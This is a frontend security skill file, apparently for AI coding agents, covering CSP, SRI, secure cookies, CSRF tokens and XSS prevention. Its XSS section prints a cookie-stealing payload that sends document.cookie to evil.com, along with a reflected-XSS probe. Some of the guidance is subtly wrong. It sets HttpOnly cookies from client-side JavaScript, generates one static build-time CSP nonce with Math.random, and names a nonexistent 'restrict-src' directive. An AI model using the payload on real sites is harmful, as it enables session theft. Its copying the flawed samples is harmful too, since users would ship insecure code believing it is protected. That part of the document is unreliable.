---
name: frontend-security
description: >
  Use this skill when the user says 'XSS', 'CSP', 'CSRF', 'SRI', 'secure cookies', 'security headers', 'frontend security', 'sanitize input', 'content security policy', 'cross-site scripting', 'cross-site request forgery', or when auditing frontend security. This skill enforces: CSP headers blocking inline scripts by default, SRI on all external resources, HttpOnly/Secure/SameSite cookies, CSRF tokens on state-changing requests, and output encoding to prevent XSS. Works with any frontend framework. Do NOT use for: backend authentication, server-side SQL injection, network security.
version: "2.0.0"
author: "j4flmao"
license: "MIT"
compatibility:
  claude-code: true
  cursor: true
  codex: true
  windsurf: true
tags: [frontend, security, universal]
---

# Frontend Security

## Purpose
Prevent XSS, CSRF, and injection attacks. CSP blocks unauthorized scripts. SRI ensures CDN integrity. Cookies locked down. All user output encoded.

## Agent Protocol

### Trigger
Exact user phrases: "XSS", "CSP", "CSRF", "SRI", "secure cookies", "security headers", "frontend security", "sanitize input", "content security policy", "cross-site scripting".

### Input Context
Before activating, verify:
- The framework and build tool (React, Vue, Vite, Next.js, etc.).
- Whether the focus is on a new feature, an audit, or a vulnerability fix.

### Output Artifact
No file output. Produces security guidance, header configs, or code fixes as text.

### Response Format
```
Issue: {description}
Severity: {critical/high/medium/low}
Config: {code block or header directive}
```

No preamble. No postamble. No explanations. No filler/hedging/transitions. Compress output — why use many token when few do trick.

### Completion Criteria
- [ ] CSP header present and blocks inline scripts (nonce or hash only).
- [ ] SRI hashes on all external CSS/JS resources.
- [ ] Cookies use HttpOnly + Secure + SameSite=Lax or Strict.
- [ ] State-changing requests include CSRF token.
- [ ] All user-supplied data is escaped before rendering (no dangerouslySetInnerHTML without DOMPurify).
- [ ] Input sanitization on all form fields.

### Max Response Length
4096 tokens.

## Security Architecture / Decision Trees

### CSP Strategy Decision Tree
```
Are inline scripts needed?
  |-- NO (all scripts are separate .js files) -->
  |     CSP: script-src 'self'
  |     Simplest, most secure. No nonce or hash needed.
  |
  |-- YES (inline event handlers, inline <script> tags) -->
  |     |-- Can generate nonce per request? -->
  |     |     YES: script-src 'self' 'nonce-{random}' (nonce-based CSP)
  |     |     NO: script-src 'self' 'sha256-{hash}' (hash-based CSP, static)
  |     |
  |     |-- Use 'strict-dynamic' for modern apps (auto-trusts scripts loaded by trusted scripts)
  |           CSP: script-src 'self' 'nonce-{random}' 'strict-dynamic'
```

### Vulnerability Triage Decision Tree
```
What type of vulnerability?
  |-- User input rendered as HTML? -->
  |     Threat: XSS
  |     Fix: DOMPurify before dangerouslySetInnerHTML or v-html
  |     Severity: CRITICAL
  |
  |-- External resource loaded (CDN, third-party)? -->
  |     Threat: Compromised CDN serves malicious code
  |     Fix: Add SRI integrity hash + crossorigin attribute
  |     Severity: HIGH
  |
  |-- State-changing request (POST/PUT/DELETE)? -->
  |     Threat: CSRF (cross-site request forgery)
  |     Fix: CSRF token in header or SameSite=Strict cookie
  |     Severity: HIGH
  |
  |-- Cookie contains session data? -->
  |     Threat: Session hijacking via XSS
  |     Fix: HttpOnly + Secure + SameSite=Strict
  |     Severity: CRITICAL
  |
  |-- Third-party script on page (analytics, ads, widgets)? -->
        Threat: Data exfiltration
        Fix: CSP restrict-src, SRI on loaded scripts
        Severity: MEDIUM
```

---

## Workflow

### Step 1: Content Security Policy
```html
<!-- Strict CSP (recommended) -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'nonce-{random}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  object-src 'none';
  base-uri 'none';
  form-action 'self';
">
```

### Step 2: Subresource Integrity
```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
```

### Step 3: Secure Cookies
```typescript
// Server-side cookie config
document.cookie = 'session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400'

// With js-cookie or similar client library — only for non-sensitive cookies
Cookies.set('preference', 'dark', {
  secure: true,
  sameSite: 'lax',
  expires: 365,
})
```

### Step 4: CSRF Protection
```typescript
// Include CSRF token in fetch
const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')

await fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken ?? '',
  },
  body: JSON.stringify({ amount, to }),
})
```

### Step 5: XSS Prevention
```tsx
// React — default escaping handles most XSS
// But NEVER use dangerouslySetInnerHTML with unsanitized input

import DOMPurify from 'dompurify'

function SafeHtml({ html }: { html: string }) {
  const clean = useMemo(() => DOMPurify.sanitize(html), [html])
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

### Step 6: Security Headers Checklist
| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Security-Policy` | (see above) | Prevents XSS & data injection |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME sniffing |
| `X-Frame-Options` | `DENY` | Prevents clickjacking |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains` | Enforces HTTPS |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Controls referrer data |
| `Permissions-Policy` | `geolocation=(), camera=()` | Limits API access |

### Step 7: CSP Violation Reporting
```typescript
// Report CSP violations to monitor attacks
const observer = new ReportingObserver(
  (reports) => {
    for (const report of reports) {
      sendToAnalytics('csp-violation', report)
    }
  },
  { types: ['csp-violation'] }
)

observer.observe()
```

### Step 8: Dependency Vulnerability Scanning
```bash
# Check for known vulnerabilities in dependencies
npm audit

# Use Snyk or GitHub Dependabot for automated scanning
# Review and update vulnerable packages within 7 days of disclosure
```

## Common Pitfalls

### 1. CSP with 'unsafe-inline' for Scripts
```html
<!-- BAD -- allows ANY inline script -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline'">

<!-- GOOD -- nonce-based, only trusted inline scripts execute -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'nonce-{random}' 'strict-dynamic'">
```

### 2. Forgetting SRI on All External Resources
Third-party CDNs can be compromised. If the CDN serves malicious JS, SRI ensures the browser rejects it. Every external `<script>` and `<link>` needs `integrity` and `crossorigin="anonymous"`.

### 3. Storing Tokens in localStorage
```typescript
// BAD -- accessible by any JS on the page (XSS can steal it)
localStorage.setItem('auth-token', token)

// BETTER -- httpOnly cookie (inaccessible by JS)
// Still needs CSRF protection
document.cookie = `session=${token}; HttpOnly; Secure; SameSite=Strict`
```

### 4. Trusting Client-Side Validation
Client validation is for UX, not security. Always validate and sanitize on the server. Client-side validation can be bypassed by disabling JS or sending direct HTTP requests.

### 5. Missing Permissions-Policy
Without Permissions-Policy, any third-party script on the page can request sensitive APIs (geolocation, camera, microphone). Explicitly disable APIs your app doesn't use.

## Compared With

| Measure | Protection Against | Implementation Difficulty | Performance Impact |
|---------|-------------------|------------------------|-------------------|
| CSP | XSS, data injection | Medium | 0 (browser enforces) |
| SRI | Compromised CDN | Low | 0 (hash check) |
| HttpOnly cookies | Session hijacking via XSS | Low | 0 |
| CSRF tokens | Cross-site request forgery | Medium | Negligible |
| DOMPurify | XSS via user HTML | Low | ~0.1ms per sanitize |
| Permissions-Policy | API abuse by third-party | Low | 0 |
| HSTS | SSL stripping | Low | 0 |

## Performance Considerations

- CSP headers add ~200-500 bytes to response headers (insignificant)
- SRI hashing adds ~50 bytes per external resource
- DOMPurify sanitization is fast (~0.1ms per typical HTML string)
- CSP violation reporting is async and non-blocking
- No performance sacrifice for security — these measures are essentially free

## Accessibility Considerations

- CSP nonces must be generated server-side and injected into scripts — ensure this works with your SSR/injection pipeline
- Security error messages should not expose technical details to users
- CAPTCHA or MFA challenges must be accessible (support keyboard, screen readers)
- Timeout-based security measures (session expiry) should give users warning before logging them out

## Security Considerations

- CSP `'strict-dynamic'` requires all trusted scripts to be loaded by a nonce-trusted script. This breaks scripts injected via innerHTML or DOM APIs — use trusted APIs like `createElement` + `appendChild`
- Service workers can bypass CSP for their own scope — secure SW registration with `register()` only on HTTPS
- Third-party scripts loaded via tag managers often bypass CSP — audit what the tag manager loads

## Rules
- CSP must use `'strict-dynamic'` for modern apps — no whitelist-based CSP.
- All external resources must have `integrity` attribute with SRI hash.
- Cookies with session data: HttpOnly + Secure + SameSite=Strict.
- Never render user input as HTML without DOMPurify.
- CSRF token on every POST/PUT/DELETE from the browser.
- `dangerouslySetInnerHTML` is banned unless paired with DOMPurify.

## Threat Modeling for Frontend

### STRIDE per Attack Surface
| Threat | Attack Surface | Mitigation |
|--------|---------------|------------|
| Spoofing | Auth tokens, API identities | Short-lived JWT, httpOnly cookies, mTLS |
| Tampering | Form data, query params, request body | Server-side validation, CSRF tokens, SRI |
| Repudiation | User actions, API calls | Audit logging, signed requests |
| Information Disclosure | Client bundle, localStorage, URL params | Minification, no secrets in client, no PII in URLs |
| Denial of Service | Form submissions, API calls | Rate limiting, CAPTCHA, max input sizes |
| Elevation of Privilege | Role/flag manipulation | Server-side authorization, signed tokens |

### Trust Boundaries
```typescript
// Trust boundary: Client ↔ Server
// Everything on the client is untrusted

// NEVER trust:
// - Client-side validation (UX only, not security)
// - LocalStorage/sessionStorage data (XSS can read it)
// - URL parameters (can be modified by user or referrer)
// - Request headers (can be spoofed)
// - Environment variables exposed to client (NEXT_PUBLIC_*, VITE_*)

// ALWAYS validate server-side:
// - Input sanitization
// - Authorization checks
// - Business logic constraints
// - Rate limiting
// - Session validation
```

## XSS Attack Vectors and Prevention

```typescript
// XSS Vector 1: Stored XSS
// User submits: <script>document.location='https://evil.com/?c='+document.cookie</script>
// If rendered unsanitized, every visitor's cookies are stolen.
// Prevention: Output encoding + CSP blocking inline scripts

// XSS Vector 2: Reflected XSS
// URL: https://example.com/search?q=<script>alert('xss')</script>
// If the search term is rendered in HTML without encoding.
// Prevention: Always encode output, never trust URL params

// XSS Vector 3: DOM-based XSS
// BAD:
element.innerHTML = userInput;
// GOOD:
element.textContent = userInput; // encodes automatically

// BAD (React):
<div dangerouslySetInnerHTML={{ __html: userHTML }} />
// GOOD (React - with sanitization):
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHTML) }} />

// BAD (Vue):
<div v-html="userHTML" />
// GOOD (Vue - with sanitization):
<div v-html="$sanitize(userHTML)" />
```

## CSP Configuration by Framework

```typescript
// Next.js CSP via middleware
// middleware.ts
export function middleware(request: NextRequest) {
  const nonce = crypto.randomBytes(16).toString('base64');
  const csp = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'unsafe-inline'`,
    `img-src 'self' data: https: blob:`,
    `font-src 'self' data:`,
    `object-src 'none'`,
    `base-uri 'none'`,
    `form-action 'self'`,
    `frame-ancestors 'none'`,
    `block-all-mixed-content`,
  ].join('; ');

  const requestHeaders = new Headers(request.headers);
  requestHeaders.set('x-nonce', nonce);

  const response = NextResponse.next({ request: { headers: requestHeaders } });
  response.headers.set('Content-Security-Policy', csp);
  return response;
}
```

```typescript
// Vite CSP via HTML transform plugin
// vite.config.ts
import { createHash } from 'crypto';

function cspPlugin() {
  return {
    name: 'csp',
    transformIndexHtml(html: string) {
      const nonce = createHash('sha256').update(Math.random().toString()).digest('base64');
      return html.replace(
        '</head>',
        `<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'nonce-${nonce}' 'strict-dynamic'"></head>`
      );
    },
  };
}
```

## Third-Party Script Security

```typescript
// Loading third-party scripts securely
// 1. Use SRI integrity hashes
// 2. Load with async/defer
// 3. Use trusted types

// Secure Google Analytics loading
const script = document.createElement('script');
script.src = 'https://www.googletagmanager.com/gtag/js?id=G-XXXXX';
script.async = true;
script.integrity = 'sha384-...'; // SRI hash
script.crossOrigin = 'anonymous';
document.head.appendChild(script);

// If CSP is strict-dynamic, third-party scripts loaded by nonce-trusted
// scripts are automatically trusted. But tag managers that inject arbitrary
// scripts bypass this protection.
// Audit tag manager containers before deploying.

// For iframe embeds (YouTube, Twitter):
<iframe
  src="https://www.youtube.com/embed/VIDEO_ID"
  sandbox="allow-scripts allow-same-origin allow-popups"
  loading="lazy"
  title="Video title"
/>
// sandbox restricts: no forms, no popups, no top-navigation
```

## Dependency Security Scanning

```bash
# CI/CD security scanning pipeline
# package.json audit
npm audit --audit-level=high

# For projects with many deps: only fail on critical+high
npm audit --audit-level=critical

# Yarn
yarn audit --level high

# Automated scanning in CI
# .github/workflows/security.yml
name: Dependency Security
on: [pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm audit --audit-level=high
      - run: npx snyk test --severity-threshold=high

# Remediation SLA:
# - Critical: 24 hours
# - High: 7 days
# - Medium: 30 days
# - Low: next quarter
```

## Security Testing in CI

```typescript
// Automated security checks for PRs
// 1. eslint-plugin-security: detect dangerous patterns
// 2. npm audit: known vulnerabilities
// 3. SRI hash checker: verify all external resources have integrity
// 4. CSP evaluator: validate CSP header effectiveness
// 5. OWASP ZAP: DAST scan on staging environment

// ESLint security rules
{
  "plugins": ["security"],
  "rules": {
    "security/detect-object-injection": "error",
    "security/detect-non-literal-regexp": "error",
    "security/detect-unsafe-regex": "error",
    "security/detect-buffer-noassert": "error",
    "security/detect-child-process": "error",
    "security/detect-disable-mustache-escape": "error",
    "security/detect-eval-with-expression": "error",
    "security/detect-no-csrf-before-method-override": "error",
    "security/detect-non-literal-fs-filename": "error",
    "security/detect-pseudoRandomBytes": "warn"
  }
}
```

## Performance Impact of Security

| Measure | Impact | Notes |
|---------|--------|-------|
| CSP header | ~200-500 bytes added to response | Insignificant |
| SRI hashing | ~50 bytes per external resource | Negligible |
| CSP violation reporting | Async, non-blocking | No user-facing impact |
| DOMPurify sanitization | ~0.1-0.5ms per string | Sub-millisecond |
| Nonce generation | ~0.01ms per request (crypto.randomBytes) | Negligible for SSR |
| mTLS handshake | ~10-50ms per connection | Use connection pooling |
| HSTS header | ~100 bytes | Zero-impact once cached |

## References
  - references/csp-implementation.md — CSP Implementation
  - references/csrf-protection.md — CSRF Protection
  - references/dependency-security.md — Dependency Security
  - references/web-security-headers.md — Web Security Headers
  - references/xss-prevention.md — XSS Prevention Guide
  - references/xss-protection.md — XSS Protection
## Handoff
No artifact produced.
Next skill: `authentication` — integrate CSRF with auth token flow.
Carry forward: CSP nonce strategy, cookie config, CSRF token source.
